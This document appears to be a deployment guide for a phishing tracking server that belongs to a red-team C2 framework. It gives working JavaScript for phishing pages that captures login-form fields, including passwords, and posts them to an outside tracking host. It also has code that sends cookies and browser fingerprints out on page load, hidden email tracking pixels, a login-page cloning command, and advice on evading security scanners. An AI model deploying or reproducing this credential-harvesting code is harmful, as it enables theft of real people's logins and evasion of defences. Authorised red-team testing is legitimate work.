# Tracker Server Deployment Guide

This guide provides detailed instructions on deploying and configuring your tracking server as part of the C2ingRed framework. The tracking server allows you to monitor visitor information, capture form data, and track email opens during red team operations.

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Deployment](#deployment)
5. [Usage Examples](#usage-examples)
6. [Advanced Features](#advanced-features)
7. [Troubleshooting](#troubleshooting)
8. [Security Considerations](#security-considerations)

## Prerequisites

Before deploying the tracking server, ensure you have:

- A Linux server (Ubuntu recommended)
- Domain name with DNS configured to point to your server
- Python 3.6+ installed
- Sudo/root privileges
- Access to ports 80/443
- (Optional) IPinfo API token for enhanced geolocation data

## Installation

You can install the tracker module in two ways:

### Option 1: Integrate with existing C2ingRed installation

```bash
python3 integrate_tracker.py --c2-dir /path/to/c2ingred --tracker-dir /path/to/tracker
```

### Option 2: Standalone installation

```bash
# Clone the repository
git clone https://github.com/yourusername/tracker-server.git
cd tracker-server

# Install dependencies
pip3 install -r requirements.txt
```

## Configuration

The tracker server uses a JSON configuration file that controls various aspects of its behavior. The key configuration sections are:

### Basic Configuration

```json
{
  "engagement": {
    "name": "campaign-name"
  },
  "server": {
    "port": 443,
    "domain": "your-tracking-domain.com",
    "email": "admin@example.com"
  }
}
```

### Tracking Features

```json
{
  "tracking": {
    "email_pixel": true,
    "form_capture": true,
    "browser_data": true,
    "detailed_logging": true,
    "enable_webhooks": false,
    "webhook_url": ""
  }
}
```

### Security Settings

```json
{
  "security": {
    "restrict_ips": false,
    "allowed_ips": ["127.0.0.1"],
    "block_bots": true,
    "block_cloud_providers": false,
    "path_restrictions": ["/logs/", "/certs/", "/config.json"]
  }
}
```

## Deployment

### Using C2ingRed Integration

```bash
python3 deploy.py --deploy-tracker \
  --tracker-domain tracking.example.com \
  --tracker-email admin@example.com \
  --tracker-name campaign-2025 \
  --tracker-ipinfo-token YOUR_IPINFO_TOKEN \
  --tracker-setup-ssl \
  --tracker-create-pixel
```

### Standalone Deployment

```bash
python3 deployment-script.py \
  --domain tracking.example.com \
  --email admin@example.com \
  --engagement-name campaign-2025 \
  --ipinfo-token YOUR_IPINFO_TOKEN \
  --setup-ssl \
  --create-pixel
```

## Usage Examples

### Email Tracking

To track email opens, embed the following HTML in your emails:

```html
<img src="https://tracking.example.com/track-open?email=target@company.com&campaign=phishing-2025&template=invoice" width="1" height="1" alt="" style="display:none;">
```

### Form Capture

To capture form submissions, add this JavaScript to your phishing page:

```html
<script>
  document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var formData = new FormData(this);
    var data = {};
    
    formData.forEach(function(value, key) {
      data[key] = value;
    });
    
    // Send to tracking server
    fetch('https://tracking.example.com/log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(function() {
      // Redirect to legitimate site
      window.location.href = 'https://legitimate-site.com';
    });
  });
</script>
```

### Browser Information Tracking

To collect browser information:

```html
<script>
  document.addEventListener('DOMContentLoaded', function() {
    fetch('https://tracking.example.com/log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        userAgent: navigator.userAgent,
        screenResolution: window.screen.width + 'x' + window.screen.height,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        cookies: document.cookie
      })
    });
  });
</script>
```

## Advanced Features

### Site Cloning

The tracker includes a site cloning tool that can create a copy of a legitimate website for phishing campaigns:

```bash
python3 Tools/site-cloner/sitecloner.py \
  https://target-login-page.com \
  /path/to/output/directory \
  --interactive
```

The cloned site will automatically include tracking code to capture form submissions.

### Webhook Integration

You can configure the tracker to send real-time notifications to external systems like Slack or Discord:

1. In your config.json, set:
```json
{
  "tracking": {
    "enable_webhooks": true,
    "webhook_url": "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
  }
}
```

2. Event data will be sent as JSON payloads:
```json
{
  "timestamp": "2025-04-03T12:34:56",
  "type": "form_submission",
  "ip": "192.168.1.1",
  "user_agent": "Mozilla/5.0...",
  "data": {
    "username": "admin",
    "password": "captured_password"
  }
}
```

## Troubleshooting

### Common Issues

1. **SSL Certificate Problems**
   - Ensure your domain is correctly pointed to your server
   - Check certbot logs: `sudo certbot certificates`
   - Verify permissions on certificate files

2. **Server Won't Start**
   - Check if ports 80/443 are already in use: `sudo netstat -tulpn | grep '80\|443'`
   - Verify that the working directory exists and is writable
   - Check server logs: `cat ~/trackers/your-engagement/logs/server.log`

3. **Not Receiving Tracking Data**
   - Confirm your tracking code is correctly implemented
   - Check browser console for JavaScript errors
   - Ensure your domain is correctly resolving: `nslookup your-domain.com`

## Quick Standalone Deployment

The tracker can be used standalone without a domain name for rapid deployment scenarios:

### IP-Based Tracking

For quick tracking without a domain name registration:

```bash
python3 deployment-script.py --ip-only --email your-email@example.com
```

This simplified deployment:
- Uses your server's IP address directly instead of a domain name
- Creates a self-signed SSL certificate (no Let's Encrypt)
- Configures the server for immediate use

### Email Tracking with IP Address

Include this HTML in your email for IP-based tracking:

```html
<img src="http://YOUR_SERVER_IP/track-open?email=target@example.com" width="1" height="1" style="display:none;">
```

### Additional Quick Deployment Options

1. **Temporary Mode**
   ```bash
   python3 deployment-script.py --quick-deploy --no-service
   ```
   Runs the tracker directly in the terminal without creating system services.

2. **Minimal Tracking**
   ```bash
   python3 deployment-script.py --minimal
   ```
   Deploys a stripped-down version with just essential tracking features.

3. **Custom Port**
   ```bash
   python3 deployment-script.py --port 8080
   ```
   Use non-standard ports when 80/443 are unavailable.

### Portable Tracker Setup

For a completely portable tracker:

```bash
# Create portable directory
mkdir ~/portable-tracker
cp -r ~/trackers/Tools ~/portable-tracker/
cp capture-server-enhanced.py ~/portable-tracker/

# Run portable tracker
cd ~/portable-tracker
python3 capture-server-enhanced.py --ip-only --port 8080
```

This creates a standalone tracker that can be quickly deployed on any system with Python installed.

### Considerations for IP-Based Tracking

- IP-based tracking is more conspicuous in logs than domain-based tracking
- Some email clients block image loading from IP addresses but allow domains
- Self-signed certificates will generate browser warnings for any interactive pages
- For better operational security, consider using disposable domains with privacy protection

## Security Considerations

When using the tracking server, keep these security considerations in mind:

1. **Operational Security**
   - Use separate infrastructure from your C2 servers
   - Deploy through proxies or redirectors to hide the true origin
   - Consider using cloud providers with relaxed ToS for red team operations

2. **Data Protection**
   - Collected data may contain sensitive information - handle according to your security policy
   - Regularly clear logs and captured data that is no longer needed
   - Use encryption when storing sensitive data long-term

3. **Detection Avoidance**
   - Enable bot blocking to avoid security scanners
   - Consider restricting access to specific IP ranges
   - Use the "block_cloud_providers" option to avoid corporate scanning infrastructure

---

## Integration with C2ingRed

This tracker server is designed to work seamlessly with the C2ingRed framework. The integration allows you to:

1. Deploy tracking infrastructure alongside C2 servers
2. Manage tracking campaigns from the same interface
3. Share configuration between tracking and C2 components
4. Correlate tracking data with C2 callbacks

For additional assistance, refer to the C2ingRed documentation or open an issue on GitHub.